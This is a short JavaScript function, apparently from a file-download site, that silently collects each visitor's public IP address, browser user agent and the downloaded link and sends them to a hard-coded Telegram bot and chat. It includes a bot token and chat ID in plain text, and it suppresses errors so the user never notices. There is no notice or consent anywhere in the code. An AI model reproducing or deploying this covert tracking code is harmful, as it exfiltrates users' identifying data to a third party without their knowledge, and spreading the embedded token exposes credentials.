export function sendLog(fileUrl) {
  const token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
  const chatId = '-1002478190818';
  const userAgent = navigator.userAgent;

  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
      const ip = data.ip;
      const message =
        `new userr.\nIP: ${ip}\nCihaz: ${userAgent}\nİndirilen link: ${fileUrl}`;

      return fetch(
        `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`
      );
    })
    .catch(() => {});
}